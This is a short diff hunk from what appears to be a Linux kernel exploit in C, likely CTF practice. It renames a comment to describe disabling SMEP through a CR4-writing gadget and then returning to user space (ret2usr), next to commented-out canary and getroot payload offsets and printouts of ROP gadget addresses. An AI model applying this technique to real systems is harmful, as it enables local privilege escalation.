@@ -102,7 +102,7 @@ int main(){
     // *(size_t *)(&payload[0x30]) = canary;
     // *(size_t *)(&payload[0x38+0x8*1]) = getroot+0x4;
 
-    // method 2 (not working)
+    // method 2 (first disable smep and then ret2usr)
     printf("pop_rdi---------------> 0x%llx\n", pop_rax);
     printf("mov_cr4_rdi-----------> 0x%llx\n", mov_cr4_rax);
 
